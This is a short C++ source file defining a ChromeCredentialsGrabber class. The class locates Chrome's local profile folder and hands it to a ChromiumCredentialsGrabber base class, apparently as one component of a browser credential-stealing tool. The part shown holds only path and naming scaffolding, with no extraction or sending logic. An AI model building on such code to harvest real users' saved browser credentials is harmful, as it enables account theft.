#include "ChromeCredentialsGrabber.hpp"

#include "Utils/Environment.hpp"

ChromeCredentialsGrabber::ChromeCredentialsGrabber():
	ChromiumCredentialsGrabber(get_local_chrome_path())
{
}

std::filesystem::path ChromeCredentialsGrabber::get_local_chrome_path()
{
	return Environment::expand_variables(CHROME_ROOT_FOLDER);
}

std::wstring ChromeCredentialsGrabber::source() const
{
	return L"Chrome";
}
